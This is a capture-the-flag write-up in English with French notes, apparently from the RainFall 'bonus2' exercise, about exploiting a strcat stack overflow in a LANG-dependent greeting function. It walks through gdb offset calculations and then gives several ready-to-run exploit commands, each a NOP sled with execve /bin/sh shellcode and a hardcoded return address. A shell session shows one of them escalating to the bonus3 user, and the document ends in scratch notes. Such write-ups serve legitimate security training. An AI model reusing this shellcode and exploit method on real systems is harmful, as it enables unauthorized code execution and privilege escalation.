# bonus02

The program take...

The program has "GCC stack protector support" enabled, so we run `gdb` with `set exec-wrapper env -u LINES -u COLUMNS`.

If `argc` is not equal to 3, the program exit.

In `greetuser` function, we have a `strcat` on a local buffer of 72 bytes. The string concatened with this buffer depends on the environment variable `"LANG"`:

- If `LANG` = `fi`, the concatened string will be "Hyvää päivää " (18 bytes)

- Else if `LANG` = `nl`, the concatened string will be "Goedemiddag! " (13 bytes)

- Else the concatened string will be "Hello " (6 bytes)

In `greetuser` function, we can see that the local buffer begin 76 bytes before the `eip` address:

```bash
Breakpoint 2, 0x080484ee in greetuser ()
(gdb) x $ebp-0x48
0xbffffd30:     134513212
(gdb) x $ebp
0xbffffd78:     -1073742280
(gdb) x $ebp+4
0xbffffd7c:     134514224
(gdb) x/x $ebp+4
0xbffffd7c:     0x08048630
(gdb) i f
Stack level 0, frame at 0xbffffd80:
 eip = 0x80484ee in greetuser; saved eip 0x8048630
 called by frame at 0xbffffe40
 Arglist at 0xbffffd78, args: 
 Locals at 0xbffffd78, Previous frame's sp is 0xbffffd80
 Saved registers:
  ebp at 0xbffffd78, eip at 0xbffffd7c
(gdb) p/d 0xbffffd7c - 0xbffffd30
$2 = 76
```

In the `main` function, we also see that only 40 bytes from the 1st parameter and 32 bytes from the 2nd parameter are copied. So 8 bytes must be added to overwrite `eip`.

- If the `LANG` variable is equal to `fi`, the string added takes 18 bytes. We need to pad with 18 bytes in the 2nd parameter (76 - 18 - 40)

- Else if the `LANG` variable is equal to `nl`, the string added takes 13 bytes. We need to pad with 23 bytes in the 2nd parameter (76 - 13 - 40)

- Else the string added is 6 bytes, that is too short to overwrite `eip`

We try to overwrite `eip`:

```bash
(gdb) set exec-wrapper env -i LANG="fi"
(gdb) r $(python -c 'print "\x41" * 40') $(python -c 'print "\x41" * 18 + "BBBB"')
Starting program: /home/user/bonus2/bonus2 $(python -c 'print "\x41" * 40') $(python -c 'print "\x41" * 18 + "BBBB"')
Hyvää päivää AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
(gdb) set exec-wrapper env -i LANG="nl"
(gdb) r $(python -c 'print "\x41" * 40') $(python -c 'print "\x41" * 23 + "BBBB"')
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /home/user/bonus2/bonus2 $(python -c 'print "\x41" * 40') $(python -c 'print "\x41" * 23 + "BBBB"')
Goedemiddag! AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
```

Nous avons donc plusieurs solutions pour ce challenge:

export EXPLOIT=$(python -c "print '\x90' * 400 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'") && export LANG="fi" && ./bonus2 $(python -c 'print "A" * 4000') $(python -c 'print "B" * 18 + "\x78\xf7\xff\xbf"')

export LANG="fi" && ./bonus2 $(python -c 'print "\x90" * 17 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"') $(python -c 'print "B" * 18 + "\xff\xf4\xff\xbf"')

export LANG="nl" && ./bonus2 $(python -c 'print "A" * 4000') $(python -c 'print "B" * 23 + "\x78\xf7\xff\xbf"')

export LANG="nl" && ./bonus2 $(python -c 'print "\x90" * 17 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"') $(python -c 'print "B" * 23 + "\xff\xf4\xff\xbf"')

bonus2@RainFall:~$ export EXPLOIT=$(python -c "print '\x90' * 400 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'")

bonus2@RainFall:~$ ./bonus2 $(python -c 'print "A" * 40') $(python -c 'print "B" * 18 + "\x78\xf7\xff\xbf"')Hyvää päivää AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBB���
$ whoami
bonus3
$ echo "You are the bonus3 user"
You are the bonus3 user
$


Premier argument du main dans le main: 0xbfffd836
	Dans la fonction greetuser: 0xbfffd5a0

Le tout dans greetuser: 0xbffff462

0xbffff4f0


r $(python -c 'print "A" * 40') $(python -c 'print "B" * 18 + "\x1e\xf5\xff\xbf" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"')

